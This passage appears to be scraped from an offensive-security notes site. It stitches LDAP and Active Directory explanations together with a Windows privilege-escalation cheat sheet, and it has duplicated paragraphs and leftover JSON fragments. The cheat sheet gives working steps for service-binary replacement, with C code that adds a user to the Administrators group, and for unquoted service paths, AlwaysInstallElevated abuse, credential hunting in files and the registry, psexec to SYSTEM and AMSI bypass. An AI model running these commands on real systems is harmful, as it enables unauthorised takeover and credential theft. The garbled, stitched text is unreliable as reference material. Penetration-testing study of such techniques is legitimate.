and responses. In the case of schema elements, there may also be user-friendly names that can be used in place of OIDs. When you look at the Active Directory with ADExplorer it will automatically translate the OIDs to more userfriendly-names, so we won't have to lookup each OID to understand what it refers to. Search Filters # Search filters are used to define criteria for identifying entries that contain certain kinds of information. There are a number of different types of search filters: Presence filters may be used to identify entries in which a specified attribute has at least one value. Equality filters may be used to identify entries in which a specified attribute has a particular value. Substring filters may be used to identify entries in which a specified attribute has at least one value that matches a given substring. Greater-or-equal filters may be used to identify entries in which a specified attribute has at least one value that is considered greater than or equal to a given value. Less-or-equal filters may be used to identify entries in which a specified attribute has at least one value that is considered less than or equal to a given value. Approximate match filters may be used to identify entries in which a specified attribute has a value that is approximately equal to a given value. Note that there is no official definition of \u201capproximately equal to\u201d, and therefore this behavior may vary from one server to another. Some servers use a \u201csounds like\u201d algorithm like one of the Soundex or Metaphone variants. Extensible match filters may be used to provide more advanced types of matching, including the use of custom matching rules and/or matching attributes within an entry\u2019s DN. AND filters may be used to identify entries that match all of the filters encapsulated inside the AND. OR filters may be used to identify entries that match at least one of the filters encapsulated inside the OR. NOT filters may be used to negate the result of the encapsulated filter (i.e., if a filter matches an entry, then a NOT filter encapsulating that matching filter will not match the entry, and if a filter does not match an entry, then a NOT filter encapsulating that non-matching filter will match the entry). The logic used to perform the matching is encapsulated in matching rules, which are specified in attribute type definitions. Different matching rules may use different logic for making the determination. For example, the caseIgnoreMatch matching rule will ignore differences in capitalization when comparing two strings, while the caseExactMatch matching rule will not. Many matching rules are specific to certain data types (e.g., the distinguishedNameMatch matching rule expects to operate only on values that are DNs and can do things like ignore insignificant spaces between DN and RDN components, ignore differences in the order of elements in a multivalued RDN, etc.). Search Base DNs and Scopes # All search requests include a base DN element, which specifies the portion of the DIT in which to look for matching entries, and a scope, which specifies how much of that subtree should be considered. The defined search scopes include: The baseObject scope (often referred to as just \u201cbase\u201d) indicates that only the entry specified by the search base DN should be considered. The singleLevel scope (often referred to as \u201cone\u201d or \u201conelevel\u201d) indicates that only entries immediately below the search base DN (but not the base entry itself) should be considered. The wholeSubtree scope (often referred to as \u201csub\u201d) indicates that the entry specified as the search base DN and all entries below it (to any depth) should be considered. The subordinateSubtree scope indicates that all entries below the search base DN (to any depth), but not the search base entry itself, should be considered. Controls # A control is a piece of information that can be included in an LDAP request or response to provide additional information about that request or response, or to change the way that it should be interpreted by the server (in the case of a request) or client (in the case of a response). For example, the server-side sort request control can be included in a search request to indicate that the server should sort the matching entries in a particular way before sending them to the client. LDAP controls have three elements: An object identifier (OID) that uniquely identifies the type of control. This is a required element. A criticality. This is a flag that indicates how the server should behave if it does not recognize a provided request control, or if it cannot support the control in the context in which it was requested. A criticality of \u201ctrue\u201d indicates that the control is a critical part of the request, and that the server should reject the request if it cannot support the control. A criticality of \u201cfalse\u201d indicates that the control is more a \u201cnice to have\u201d part of the request, and that if the server cannot support the control then it should go ahead and process the operation as if the control had not been included. The criticality does not come into play if the server does support the control within the context of the request. An optional value, which can provide additional information for use in processing the control. For example, for a server-side sort request control, the control value should specify the desired sort order. The encoding for a control varies based on the type of control. LDAPSEARCH Syntax # In order to authenticate to the LDAP server we need a username and password. The username is entered in the form of a Dinstingushed Name (DN) since that is a unique identifier. In the LDAP world this is called \"bind dn\". For example: -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" . The Search Base is specified with the -b flag in ldapsearch. For example: -b \"dc=evilcorp,dc=local\" . ldapsearch will automatically default to the scope subTree, and the filter objectClass=* . This is the basic syntax of a ldapsearch query: usage: ldapsearch [options] [filter [attributes...]] .

This is different from a relational database, which uses tables comprised of rows and columns, so directory servers may be considered a type of NoSQL database (even though directory servers have been around a lot longer than the term NoSQL has). While virtually all directory servers support LDAP, some servers offer support for additional protocols that can be used to interact with the data. Some of these protocols include X.500 (the original Directory Access Protocol, for which LDAP is a much more lightweight version), naming service protocols like DNS and NIS, HTTP-based protocols like DSML and SCIM, and proprietary protocols like Novell\u2019s NDS.

The DN of an LDAP entry is much like the path to a file on a filesystem. An LDAP DN is comprised of zero or more elements called relative distinguished names, or RDNs. Each RDN is comprised of one or more (usually just one) attribute-value pairs. For example, \"uid=john.doe\" represents an RDN comprised of an attribute named \"uid\" with a value of \"john.doe\". If an RDN has multiple attribute-value pairs, they are separated by plus signs, like \"givenName=John+sn=Doe\". The special distinguished name comprised of zero RDNs (and therefore has a string representation that is just an empty string) is sometimes called the \u201cnull DN\u201d and references a special type of entry called the root DSE which provides information about the content and capabilities of the directory server. For DNs with multiple RDNs, the order of the RDNs specifies the position of the associated entry in the DIT. RDNs are separated by commas, and each RDN in a DN represents a level in the hierarchy in descending order (i.e., moving closer to the root of the tree, which is called the naming context). That is, if you remove an RDN from a DN, you get the DN of the entry considered the parent of the former DN. For example, the DN \"uid=john.doe,ou=People,dc=example,dc=com\" has four RDNs, with the parent DN being \"ou=People,dc=example,dc=com\". A Distinguished Name (DN) should be read from left to right. The RDNs more to the left represent the higher branches of a tree. The RDN to the far right represent the trunk of the tree.

Attribute types may also indicate whether an attribute is allowed to have multiple values in the same entry, and whether the attribute is intended for holding user data (a user attribute) or is used for the operation of the server (an operational attribute). Operational attributes are typically used for configuration and/or state information. Attribute options are not used all that often, but may be used to provide some metadata about an attribute.

There are a number of different types of search filters: Presence filters may be used to identify entries in which a specified attribute has at least one value. Equality filters may be used to identify entries in which a specified attribute has a particular value. Substring filters may be used to identify entries in which a specified attribute has at least one value that matches a given substring. Greater-or-equal filters may be used to identify entries in which a specified attribute has at least one value that is considered greater than or equal to a given value. Less-or-equal filters may be used to identify entries in which a specified attribute has at least one value that is considered less than or equal to a given value. Approximate match filters may be used to identify entries in which a specified attribute has a value that is approximately equal to a given value. Note that there is no official definition of \u201capproximately equal to\u201d, and therefore this behavior may vary from one server to another. Some servers use a \u201csounds like\u201d algorithm like one of the Soundex or Metaphone variants. Extensible match filters may be used to provide more advanced types of matching, including the use of custom matching rules and/or matching attributes within an entry\u2019s DN. AND filters may be used to identify entries that match all of the filters encapsulated inside the AND. OR filters may be used to identify entries that match at least one of the filters encapsulated inside the OR. NOT filters may be used to negate the result of the encapsulated filter (i.e., if a filter matches an entry, then a NOT filter encapsulating that matching filter will not match the entry, and if a filter does not match an entry, then a NOT filter encapsulating that non-matching filter will match the entry). The logic used to perform the matching is encapsulated in matching rules, which are specified in attribute type definitions. Different matching rules may use different logic for making the determination. For example, the caseIgnoreMatch matching rule will ignore differences in capitalization when comparing two strings, while the caseExactMatch matching rule will not. Many matching rules are specific to certain data types (e.g., the distinguishedNameMatch matching rule expects to operate only on values that are DNs and can do things like ignore insignificant spaces between DN and RDN components, ignore differences in the order of elements in a multivalued RDN, etc.).","title":"Search Filters"},{"location":"attacking_active_directory_domain/good_to_know/ldap_syntax/#search-base-dns-and-scopes","text":"All search requests include a base DN element, which specifies the portion of the DIT in which to look for matching entries, and a scope, which specifies how much of that subtree should be considered.

Services with Vulnerble Permissions # Services on windows are programs that run in the background. Without a GUI. They are almost always started and run by NT Authority. Therefore the files, folder and registry keys need correct permissions. 2.1 Insecure Registry Permissions # In Windows, information related to services is stored in HKLM\\SYSTEM\\CurrentControlSet\\Services registry key. If we want to see information about a specific service, you can check HKLM\\SYSTEM\\ControlSet001\\Services\\Vulnerable Service . In that registry there is a key called ImagePath which contains a UNC path to the executable. So if an attacker has the permission to edit that key, the attacker can change it to point to an executable of his/hers choice. You can check if the registry is editable from the command-line but you can also check if from regedit.exe. It is uncommon that this key can be edited by a low priviliged user. But it is still something to test.

That can be done with the sysinternal tool accesschk.exe or with powersploit Using PowerSploit - Privesc # Enumerates all services and returns services for which the current user can modify the binPath. Get-ModifiableService Set-ServiceBinaryPath Using accesschk.exe # accesschk.exe -uwcqv \"YourUser\" * All services that \"YourUser\" can modify will be listed. SERVICE_ALL_ACCESS means we have full control over modifying the properties of Vulnerable Service. For more details on how to actually change the binPath and restart the service see: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ Manually # First we need to find services. That can be done using wmci or sc.exe . Wmci is not available on all windows machines, and it might not be available to your user. If you don't have access to it, you can use sc.exe . WMCI wmic service list brief This will produce a lot out output and we need to know which one of all of these services have weak permissions. In order to check that we can use the icacls program. Notice that icacls is only available from Vista and up. XP and lower has cacls instead. As you can see in the command below you need to make sure that you have access to wimc , icacls and write privilege in C:\\windows\\temp . for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> c:\\windows\\temp\\permissions.txt for /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\" Binaries in system32 are excluded since they are mostly correct, since they are installed by windows. sc.exe sc query state= all | findstr \"SERVICE_NAME:\" >> Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i >> services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" >> path.txt Now you can process them one by one with the cacls command. cacls \"C:\\path\\to\\file.exe\" Look for Weakness What we are interested in is binaries that have been installed by the user. In the output you want to look for BUILTIN\\Users:(F) . Or where your user/usergroup has (F) or (C) rights. Example: C:\\path\\to\\file.exe BUILTIN\\Users:F BUILTIN\\Power Users:C BUILTIN\\Administrators:F NT AUTHORITY\\SYSTEM:F That means your user has write access. So you can just rename the .exe file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom. Here is a POC code for getsuid. #include <stdlib.h> int main () { int i; i = system(\"net localgroup administrators theusername /add\"); return 0; } We then compile it with mingw like this: i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe Restart the Service Okay, so now that we have a malicious binary in place we need to restart the service so that it gets executed. We can do this by using wmic or net the following way: wmic service NAMEOFSERVICE call startservice net stop [service name] && net start [service name]. The binary should now be executed in the SYSTEM or Administrator context. Migrate the meterpreter shell If your meterpreter session dies right after you get it you need migrate it to a more stable service. A common service to migrate to is winlogon.exe since it is run by system and it is always run. You can find the PID like this: wmic process list brief | find \"winlogon\" So when you get the shell you can either type migrate PID or automate this so that meterpreter automatically migrates. http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html 2.3 Insecure Service File/folder permissions # If you find a service where the low-priv user has write permissions in the of the binary that is started by the service, the user can switch the binary to an evil binary and have that binary executed by NT Authroity. PowerSploit Privesc/PowerUp # The easiest way to find these vulnerabilities is with the Powersploit. Download the PowerSploit module Privesc. Unzip it and place the entire Privesc folder in the Documents folder of your user: \\Documents\\WindowsPowerShell\\Modules\\Privesc\\ Here you can download it: https://github.com/PowerShellMafia/PowerSploit/tree/dev/Privesc In order to import the module the easiest is to do the following in a powershell shell: powershell.exe -Exec bypass import-module Privesc # Check that it worked get-command -Module Privesc Now you can either run all checks to check all privesc possibilities. Or just check weak services with: invoke-AllChecks Now check for the output from Services-delen. If you have a domain-user check for files where the usergroup NT/Authenticated users can write files. If youy user can't restart the service you will have to restart the machine. 3. Unquoted Service Paths # So the idea here is that if the path to a service binary/executable is (1) not surounded by quotation-marks (\"\"), and the and the attacker has write-permissions on The basic idea is to make a service execute a malicious binary when it is started. For this to work the following conditions must be met: 1. The UNC path must not be sourounded by quotes \"\". 2. The path must contain a space, for example \\windows\\my files\\test.exe . 3. The attacker must have write-permissions the directory with space in the name. So in the case it must have write permissions in \\my files\\ . The PATH to the service binary is set in the registry. Exploit with PowerSploit # Get-UnquotedService Manually # Find Services With Unquoted Paths # Using WMIC wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\" # Using sc sc query sc qc service name # Look for Binary_path_name and see if it is unquoted. If the path contains a space and is not quoted, the service is vulnerable. Exploit It If the path to the binary is: c:\\Program Files\\something\\winamp.exe We can place a binary like this c:\\program.exe When the program is restarted it will execute the binary program.exe , which we of course control. We can do this in any directory that has a space in its name. Not only program files . This attack is explained here: http://toshellandback.com/2015/11/24/ms-priv-esc/ There is also a metasploit module for this is: exploit/windows/local/trusted_service_path 4. AlwaysInstallElevated - Install new program as privileged user # This is a pretty simple privilege escalation attack. If this registry key is set a user is able to install any program. And when it is installed, it is installed as administrator. This means that if the attacker creates a install-package, .msi file, and then clicks on it, the package will be installed by the administrator/NT Authority. So if the attacker creates a install-package that adds a new privilege user the new user will be created. Check to see if the registry key is set: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated Or reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated http://toshellandback.com/2015/11/24/ms-priv-esc/ Exploit it using PowerUp.ps1 Write-UserAddMSI This will create an isntallation-file on the desktop. Once you click that you get a dialog where you can enter the new user and password you would like to create. It then gets created when you continue the installation. 5. DLL Hijacking # First check what services are running. Second, check if those services are running as LocalSystem. Third, check that the service is not a windows default service. Fourth, check if you have any directory in the PATH variable that you have write-permissions to. Now that you have enumerated the custom services that are running we need to find out if they load any DLL:s that doesn't exist. Run it locally # One way is to install the program locally on a computer where you are Administrator. You can run procmon at the same time, so that you can check what DLL:s it is trying to load. Check the executable and check for LoadLibrary functions. # I have never tried this tool, so who knows. There is a tool for this: https://github.com/Cybereason/siofra Otherwise you can maybe search for strings in the binary, take all the DLL:s that you find that it is invoking. Whether it exists or not. And then you create a malicios DLL and copy it to every name of the files you find when you searched for strings in the binary. No good method for it if you can't use Procmon. Read this https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ 6. Check installed software for exploits # Check what programs are installed on the machine, and google to to see if any of them contains local privilege escalations. 7. Cleartext Passwords / Stored credentials # Search for them # findstr /si password *.txt findstr /si password *.xml findstr /si password *.ini #Find all those strings in config files. dir /s *pass* == *cred* == *vnc* == *.config* # Find all passwords in all files. findstr /spin \"password\" *.* findstr /spin \"password\" *.* In Common Files # These are common files to find them in. They might be base64-encoded. So look out for that. c:\\sysprep.inf c:\\sysprep\\sysprep.xml c:\\unattend.xml %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml dir c:\\*vnc.ini /s /b dir c:\\*ultravnc.ini /s /b dir c:\\ /s /b | findstr /si *vnc.ini In Registry # # VNC reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" # Windows autologin reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" # SNMP Paramters reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" # Putty reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" # Search for password in registry reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s Check browser creds # So if you gotten access to a machine as another user. You can check to see if that user has stored credentials in the browser. USe the following metasploit module: run post/windows/gather/enum_chrome run post/multi/gather/firefox_creds 8. Kernel exploits # Kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine. Identify the hotfixes/patches systeminfo # or wmic qfe get Caption,Description,HotFixID,InstalledOn Python to Binary If we have an exploit written in python but we don't have python installed on the victim-machine we can always transform it into a binary with pyinstaller. Good trick to know. Service only available from inside # Sometimes there are services that are only accessible from inside the network. For example a MySQL server might not be accessible from the outside, for security reasons. It is also common to have different administration applications that is only accessible from inside the network/machine. Like a printer interface, or something like that. These services might be more vulnerable since they are not meant to be seen from the outside. netstat -ano Example output: Proto Local address Remote address State User Inode PID/Program name ----- ------------- -------------- ----- ---- ----- ---------------- tcp 0.0.0.0:21 0.0.0.0:* LISTEN 0 0 - tcp 0.0.0.0:5900 0.0.0.0:* LISTEN 0 0 - tcp 0.0.0.0:6532 0.0.0.0:* LISTEN 0 0 - tcp 192.168.1.9:139 0.0.0.0:* LISTEN 0 0 - tcp 192.168.1.9:139 192.168.1.9:32874 TIME_WAIT 0 0 - tcp 192.168.1.9:445 192.168.1.9:40648 ESTABLISHED 0 0 - tcp 192.168.1.9:1166 192.168.1.9:139 TIME_WAIT 0 0 - tcp 192.168.1.9:27900 0.0.0.0:* LISTEN 0 0 - tcp 127.0.0.1:445 127.0.0.1:1159 ESTABLISHED 0 0 - tcp 127.0.0.1:27900 0.0.0.0:* LISTEN 0 0 - udp 0.0.0.0:135 0.0.0.0:* 0 0 - udp 192.168.1.9:500 0.0.0.0:* 0 0 - Look for LISTENING/LISTEN . Compare that to the scan you did from the outside. Does it contain any ports that are not accessible from the outside? If that is the case, maybe you can make a remote forward to access it. # Port forward using plink plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080 # Port forward using meterpreter portfwd add -l <attacker port> -p <victim port> -r <victim ip> portfwd add -l 3306 -p 3306 -r 192.168.1.101 So how should we interpret the netstat output? Local address 0.0.0.0 Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface. This means that anyone can connect to it. Local address 127.0.0.1 Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. This is interesting to us! Local address 192.168.1.9 Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. This is also interesting to us! Vulnerable Drivers # Some driver might be vulnerable.

As for now I just copy-paste the text and past it into my linux-terminal. Yeah I know this ain't pretty, but it works. You can of course change the name SYSTEM to another privileged user. cat schtask.txt | grep \"SYSTEM\\|Task To Run\" | grep -B 1 SYSTEM Escalate to SYSTEM from Administrator # On Windows XP and Older # If you have a GUI with a user that is included in Administrators group you first need to open up cmd.exe for the administrator. If you open up the cmd that is in Accessories it will be opened up as a normal user. And if you rightclick and do Run as Administrator you might need to know the Administrators password. Which you might not know. So instead you open up the cmd from c:\\windows\\system32\\cmd.exe . This will give you a cmd with Administrators rights. From here we want to become SYSTEM user. To do this we run: First we check what time it is on the local machine: time # Now we set the time we want the system CMD to start. Probably one minuter after the time. at 01:23 /interactive cmd.exe And then the cmd with SYSTEM privs pops up. Vista and Newer # You first need to upload PsExec.exe and then you run: psexec -i -s cmd.exe Kitrap # On some machines the at 20:20 trick does not work. It never works on Windows 2003 for example.

This can be bypassed by utilizing rasta-mouses amsi-bypass which patches the memory to allow execution of suspicious commands. Description AMSI # The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads. AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided by today's antimalware products that can be integrated into applications. It supports a calling structure allowing for file and memory or stream scanning, content source URL/IP reputation checks, and other techniques.

Share is not writable If you try to authenticate using a local account that belongs to the Administrators group you might get the error below. This is because a non-default local administrator account can't write to ADMIN$ . [-] share 'ADMIN$' is not writable. [-] share 'C$' is not writable. SMBv1 is disabled If you use winexe against a windows 10 machine, you might get this error ERROR: Failed to open connection - NT_STATUS_CONNECTION_RESET . This is most likely because winexe is using SMBv1, which is disabled by default on Windows 10. Anti-virus It might be that the payload gets caught by anti-virus. Metasploits exploit/windows/smb/psexec_psh , and exploit/windows/smb/psexec both get caught by windows-defender, for example. Not a true admin account Local admin accounts (that are not the builtin Administrator accounts) can't use PSEXEC because since Windows patched that. But the default 500 Administrator always can. WinRM / Windows Remote Managements # Port: 5985/TCP/HTTP, 5986/TCP/HTTPS Tools: WinRM, Enter-PSSession, Invoke-Command First let's try to understand the common terminology. WinRM: Windows Remote Management, is Microsoft\u2019s implementation of the WS-Management protocol WS-Management: Web Services-Management, is an open standard that is based on SOAP messages to remotely exchange messaging data WinRS: Windows Remote Shell is a function of WinRM and is used to create a shell remotely on a Windows host and execute commands. This is usually what most open source libraries that claim WinRM support work with PSRP: PowerShell Remoting Protocol is a separate protocol that runs over WinRM, this is the protocol that is used when executing a command with Invoke-Command or Enter-PSSession and has some differences with WinRS Implementations # The following are some tools that use WinRM. PowerShell PSRemoting New-PSSession -ComputerName <computername> -Credential (Get-Credential) Enter-PSSession <host> -Credential <domain>\\<user> Invoke-Command <host> -Credential $cred -ScriptBlock {Hostname} # Upload file to remote session Copy-Item -Path C:\\Temp\\PowerView.ps1 -Destination C:\\Temp\\ -ToSession (Get-PSSession) # Download file from remote session Copy-Item -Path C:\\Users\\Administrator\\Desktop\\test.txt -Destination C:\\Temp\\ -FromSession (Get-PSSession) $SecPassword = ConvertTo-SecureString 'supersecretpassword' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('domain\\dfm.a', $SecPassword) Connect-WSMan -Credential $Cred -ComputerName targetmachine Why is it not working? # No WinRM server is running If you have access to the computer you can enable WinRM. This is probably not something you want to do. Because by default I think it will go over HTTP, and you will not want to authenticate over HTTP. But FYI this is how it is done: winrm quickconfig Enable-PSRemoting WMI / Windows Management Instruments / WMIC # WMI: Windows Management Instruments WMIC: Windows Management Instruments Command-line Ports: 135 (Default. DCOM) Port: 5986 (if WinRM is used) WMI can be used locally. But from an attackers perspective is how we can use it remotley, over the network. When used over the network two protocols are used: WinRM and DCOM. WMI is based on a client-server model. There are many different clients, the following are some native windows clients: wmic.exe PowerShell (A number of cmdlets can be used) VBScript JScript wbemtest.exe C/C++ via COM winrm.exe winrs.exe The server is: WMIService (WINmgmt) DCOM: Distributed Component Object Model, has been the default protocol used by WMI. It runs on port 135, subsequent data is transfered over randomly selected tcp port. All the windows built-in cmdlets and methods use DCOM as the default protocol. WinRM: WinRM has superseded DCOM as the default protocol for remote WMI communication.

So you have: Forest, Tree, Branch, Leaf Forest The forest is the absolut top level of your AD structure. The forest means: all the domains. A forest can contain multiple domain container objects. Ie, many domains. In a company you can a have multiple forests. Tree A tree in AD referes to a Domain. The first domain in the forest is called the forest root domain. Leaf A leaf object is any objects that cannot contain another object. Examples of these are: Users, Computers, Groups. Design Principles of an Active Directory # An AD can be organized in many different ways, and there is not right answer, but there are many wrong answers. But a good idea is to structure the AD in the same way as the organisation is structured. These principles aren't mutually exclusive, usually they are combined. OUs are flexible objects, and the structure can be changed fairly easily. Map the organizations structure - OUs for major business units (HR, Economy, Sales, etc) Map the geographical structure - Create OUs based on geography, for example OU for each country, with sub-OUs in each city. Create separate OU for workstations and servers Create separate OUs for workstations and user - makes it easier to apply relevant GPOs. Good ideas: - Use a Standardize Naming Convention For example letter of first name + lastname. or \"svc_name\" for service accounts. Don't nest to many levels of OUs. How many is to many? If each OU has a separate GPO, it might taker longer time for the user to log in, because to many GPOs will be applied. Organizational Unit (OU) # OUs are containers of other AD objects. OUs are often used to logically separate users into managable units. For example, to have OU for each country where the company has offices. That country OU might then be separated into city specifc OUs. You can thus have an OU inside an OU. A user cannot belong to two OUs at the same time. An OU is a container. It is a container because an OU can contain other elements, such as users or computer. A group is not a container. A group is just a simple entry with the attribute \"members\". The value of that attribute defines who is a member of the group. The group can therefore not contain other entries/objects, like a OU can. There are basically two reasons to use OU: - Control the delegation of administrative responsibility. So that one user is able to administer all the users in one OU, but no other users. - To apply GPOs on a limited number of users the GPO can be associated with a specific OU. The OU is the smallest unit to which you can assign a GPO. You can't, for example assign a GPO to a generic container (such as Users and Computers). Those containers inherit the root GPOs though. It is best practice to not mix computer objects with user objects in OUs. Managed by This might seem as an intriguing attribute that all OUs have. Unfortunatly, it is not that interesting as it sounds. It doesn't give the user any additional permissions over the OU. It is more a label to know who is the business owner of that group. So maybe the boss over that business area. Containers # There are a few differences between a OU and a Container. The main difference is that you can't apply GPOs on containers, only on OUs. A container cannot be created using Active Directory Administrative Center (ADAC) or Active Directory Users and Computers (ADUC). Instead you need to use ADSI Edit, and you user must belong to the Schema Admins security group. By default the only user belonging to that group is the AD account Administrator. There are some containers that is good to know: - Builtin - stores a number of the default groups - Users - stores other default groups (such as Domain Admins). This is where new users are create if no OU is specified. - Computers - stores computer accounts when a new accounts is created, for example when a computer is joined to the domain. Active Directory Groups # Groups are used to collect user accounts, computer accounts, and other groups into manageable units. Working with groups instead of with individual users helps simplify network maintenance and administration. There are two types of groups in Active Directory: Distribution groups - Used to create email distribution lists. Security groups - Used to assign permissions to shared resources. For a security perspective it is of course the Security Groups that are of interest to use. Security Principal # You hear this term quite a bit. In Java and Microsoft terminology a Security Principal is an entity that can be authenticated. In practice this means user account, service account, computer account, or thread or process that runs in of a user account or computer account. Each security principal is represented by a unique Security Identifier (SID). Local Security Principals are managed by the Security Account Manager (SAM). Security identifiers (SID) # A SID is a value that is used to identify a unique Security Principal. Every time a user signs in the an access token is created for that Security Principal. If you come from a Web background you can simply understand the token as a cookie or a JWT. The token contains the user's SID, user rights, and the SIDs for the groups that the user belongs to. Apart from these specific SIDs there are also some well known SIDs, like Everyone and World . Access token # An access token is a protected object that contains information about a users SID, suer rights and SIDs for groups the user belongs to. When a user authenticates to a computer the whole authentication is performed. If the authentication is successful the process returns a SID and list of SIDs for the users security groups. The Local Security Authority (LSA) uses those SIDs to create an access token. After LSA create the primary access token a copy of that access token is attached to every process that the user initiates. Whenever an action needs to be performed that requires user rights the operating system need to check that the user has those priviliges. So it checks the associated token to see if it has the correct level of privilige. So it is just like a web-application. There are two types of access tokens: primary and impersonating . ACL - Access Control List # So when we talk about the possibility to edit an ACL, it is the ACL of a AD object (user, group, computer), not specific files. Access priviliges to certain AD resrouces are configured through Access Control Entries (ACE). An ACL is the collection of Access control entries for a specific object. So each object, such as a computer has an Access Control Entry, which is included in the Access Control List. So it is basically just a list of who gets access to the object, and what type of access (read, write,modify, delete, etc). An ACE refers to a specific security principal (User, Group, Computer,e tc). Example of interesting permissions a user can have of another object is: owner, writeOwner, genericALl, writeDACL.

That is deliberate, because Group Policies can't be applied containers. So you can't accidentally apply a GPO to those containers. In a sense the Builtin groups are a legacy feature, and many of the groups are not really appropriate.

The policies can be applied to the Computer or to the User . Group Policy has nothing to do with Groups. They are completely separated components. An instance of a Group Policy is usually called Group Policy Object (GPO). A GPO can be used to, for example, set the screensaver on a computer, specify which control panel options should be available to the user, which programs should be showed in the start menu. The settings can then be applied to set of user or computer objects by linking the GPO with a OU or a Domain. A GPO can be applied to a Site, Domain and OU. It cannot be applied to a container (such as Builtin or Users ). Group Policies are extremly powerful, and a misconfigured GPO can shutdown the operation of an company. It is also extremly granular. You can make detailed changes applied to only a few objects in a specific OU. There are some best practices that are good to keep in mind when using GPOs: Keep user and computer settings in different GPOs. Apply the smallest number of GPOs to solve the problem. Try to avoid duplicating settings in differnt GPOs. Two GPOs are create by default when you first install Active Directory: Default Domain Policy - Basically only sets the Password and lockout policy. Default Domain Controllers Policy - Set security configurations for the Domain Controllers. It is common to not edit the default policies and instead create new ones. If you mess things up, you can just remove those policies and you always have the default ones clean. Started GPOs It is common to create template GPOs, these are called Starter GPOs. These can be used if you need to create multiple GPOs that share a lot of configurations, but differ on some. Working with GPOs # GPOs are managed from the \"Group Policy Management Console\" (GPMC or just GPM). In broad strokes a GPO allows for computer configuration and user configurations. Computer configuration - applied to the computer irrespective of the user who logged on. User configuration - applied to the user irrespective of the computer they're using. Both of these configurations (User and computer) have Policies and Preference settings. Policies for user configuration are placed in the HKEY_CURRENT_USER (HKCU) area of the Registry, while those for computer configurations are placed in the HKEY_LOCAL_MACHINE (HKLM) area. Policies Policies contain settings that have been available since Group Policy was introduced in Windows 2000. These are thousands of settings that can be done. They are divided up in three groups: Software settings, Windows settings, and Administrative Template. Both User and Computer configurations have the same main categories (Software, Windows, Administrative Template). But the differe. So some configurations are only available for Computers, and other are only Available for Users. In fact, the Computer Configuration branch has 1644 settings available, whereas the User Configuration branch has 1453 settings available. Computer policies are the following: Software settings - Used to automatically install programs. You configure a UNC path to a .msi and that package will be installed the assigned computer, or the computer where a user log in. Windows settings - DNS, Startup/shutdown scripts, Deploy printer, and Security - firewall rules, trusted root certificate, password options, audit logs. Administrative Template - This is where the majority of configurations are. Not really use the difference between Windows settings and Administrative Template. Preferences Preferences are what they sound like: they are what is prefered. This means that they can be overridden by a user. It is just a preference, not a law. Before prefences was included in Windows 2008 many configurations were configured through logon-scripts. Things that are configured with Preferences are: - Drive and printer mappings - Power scheme management - File and folder management, including creating and deleting files and folders - Applications - Network share management - Scheduled tasks (This is where the GPP-vuln is found - see (Passwords in Group Policy Preferences)[../active_directory_privilege_escalation/passwords_in_group_policy_preferences]) - Services - Also suceptible to GPP-vuln. It is possible, and probably a good idea, to disable all User configurations if a GPO is suppose to be applied only to Computers, and vice verse. This can be done in the Applying GPOs # The process of applying a GPO to a specific container (Site, Domain, OU) is usually called linking. If you haev a GPO but it is not linked to any container then it doesnt really do anything. You can link and unlink a GPO. You usually do this but opening the GPMC and then either click on a container and create a new GPO. Or create a GPO in \"Group Policy Objects\" and then drag the GPO to the container you want to link it to. It usually takes up to 90 minutes for the computers in the domain to poll for the new GPOs, this can be bypassed by runnign the command gpupdate /force . Security updates cna take up to 16 hours. Domain Controllers update GPOs every 5 minutes. Order of applying GPOs # Site Domain OU Nested OU If multiple GPOs have made the same GPO change, the lowest in the chain (closes to the leaf) is the one that will be applied. BLocking and overriding # Blocknig inheritance GPOs are inherited by OUs. So if one OU has a GPO linked to it, the GPO will be applied to all the sub-OUs. The GPO is therefore inherited.

You can add Groups, and only the users belonging to that group will have the GPO applied. The default is \"Authenticated users\".

